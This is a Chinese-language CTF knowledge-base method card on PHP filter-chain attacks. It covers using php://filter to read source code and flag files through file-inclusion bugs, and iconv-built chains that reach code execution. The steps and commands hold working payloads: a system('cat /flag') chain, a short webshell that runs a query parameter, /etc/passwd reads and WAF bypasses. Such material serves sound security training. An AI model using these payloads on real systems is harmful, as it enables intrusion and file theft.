---
title: 方法卡 · PHP 过滤器链（php://filter 读源码 / convert.iconv 造码）
category: web
tags: [php, filter-chain, 伪协议, iconv, lfi, base64绕WAF, 文件包含]
signals:
  - '参数形如 file=index.php 且能读回 PHP 源码'
  - '请求里出现 php://filter/convert.base64-encode'
  - 'include 接收 GET 参数且无固定前缀'
  - '读 /flag 时只回显 base64 或空白页'
  - '过滤了 ../ 与 data:// 却漏掉 php://filter'
  - 'disable_functions 很长但允许 stream 包装器'
difficulty: hard
source: kb/web/php-filter-chain.md, kb/web/lfi-rfi-and-log-poisoning.md
tools: [python, burpsuite, php_filter_chain_generator]
updated: 2026-11-03
---

# 方法卡 · PHP 过滤器链（php://filter 读源码 / convert.iconv 造码）

## 适用场景

- include 参数可控：`?file=index.php`、`?page=home`，能读回源码 → 文件包含；
- 读 `/flag` 被拒：`php://filter/convert.base64-encode/resource=/flag` 返回空 / 只吐 base64；
- 想读源码但 WAF 拦了 `../` 和 `php`，只能靠白名单或大小写技巧绕；
- 附件有 `FROM php:7.4-fpm`、`php.ini`、`open_basedir=/var/www`；
- **RCE 变体**：include 的**整个参数**可控（`include $_GET['p']` 而非 `include "pages/".$p`），上传不了文件，flag 在 `/flag`，`disable_functions` 关了一堆。

## 前置条件

- PHP 装了 `iconv` 扩展（`php -m | grep iconv`），`convert.iconv` 才能用；纯 base64 读源码不需要；
- `include`/`require`/`file_get_contents` 的参数能被完整控制（前缀拼接会让 `php://filter` 解析失败）；
- `allow_url_include=Off` **不影响** `php://filter`，只影响 `http://`、`data://`、`php://input`；
- 本卡脚本**离线**生成链字符串与探测清单，不发包、不读目标文件。

## 步骤

1. **确认包含点**：`?file=index.php` 读回源码；`?file=/etc/passwd` 验证穿越。
2. **加 base64 防执行**：`php://filter/convert.base64-encode/resource=index.php`（`.php` 直接包含会被执行，输出为空）。
3. **读 flag**：`resource=/flag`；被拦就双编码 `read=convert.base64-encode|convert.base64-encode`。
4. **读不到就转 RCE**：确认整个参数可控 → 用 `--chain '<?=system("cat /flag");?>'` 生成 iconv 链，整串塞进参数并 URL 编码。
5. **无回显**：payload 改成 `<?=`$_GET[0]`;?>`，二次请求带 `0=cat /flag`。
6. **链太长撞 URL 长度上限**：先落一个短 webshell 再干活。

```powershell
# 基础读：读源码 / 读 flag / 双重编码绕"只 ban 一次 base64"
.\.venv\Scripts\python.exe kb/_methods/scripts/php_filter_chain.py --read index.php
.\.venv\Scripts\python.exe kb/_methods/scripts/php_filter_chain.py --read /flag --double
# 生成 iconv 造码链（离线按 Synacktiv 的字符表拼前缀/后缀，输出可粘贴的 payload）
.\.venv\Scripts\python.exe kb/_methods/scripts/php_filter_chain.py --chain '<?=system("cat /flag");?>'
# 只做编码/URL 处理与坏字符检查
.\.venv\Scripts\python.exe kb/_methods/scripts/php_filter_chain.py --chain '<?=phpinfo();?>' --urlencode
```

## 脚本

脚本路径：`kb/_methods/scripts/php_filter_chain.py`（纯标准库，离线）

- `build_read(target, double=False, rot13=False)`：生成 `php://filter/.../resource=` 读链，支持双 base64 / rot13 变体；
- `build_chain(code, urlencode=False)`：按 Synacktiv 的「CSISO2022KR 插入 `\x1b$)C` → base64-decode 删非法字符」分段模型拼出可 include 的链；
- `check_blockers(text)`：检查 `php`/`filter`/`../`/`data://` 是否被关键字拦，给出改写建议；
- `parse_kv(text)`：解析 `--read`/`--chain` 这类必填参数，缺参数时报中文错误；
- `--selftest`：固定断言 6 组，退出码 0 才算过。

## 失效场景

- **`include "pages/".$_GET['p']`** 带前缀：`php://filter` 无法解析，只能 `../` 吃掉前缀或转 LFI + 日志包含。
- **容器没装 iconv**：`convert.iconv` 链全部失效，只剩 base64 读源码这一条路。
- **`file_get_contents` 只读不回显**：能读不能执行，造码链不适用。
- **链长度超限**：几十到上百个 `convert.iconv` 对拼出来常见 3~8KB，URL 长度或 WAF 长度限制会截断，需先落短木马。
- **`php` 关键字被 WAF 拦**：`PHP://`、`php://filter//convert.base64-encode`、`phar://` 可试，但正则若大小写不敏感就无效。
- **`open_basedir` 限制**：读不到 `/flag` 与 `/etc/passwd`，只能在 Web 目录内打。

## 相关文档

- `kb/web/php-filter-chain.md`（Synacktiv 原理解析、四件套过滤器、RCE 变体）
- `kb/web/lfi-rfi-and-log-poisoning.md`（日志包含、session 文件包含、`....//` 绕过）
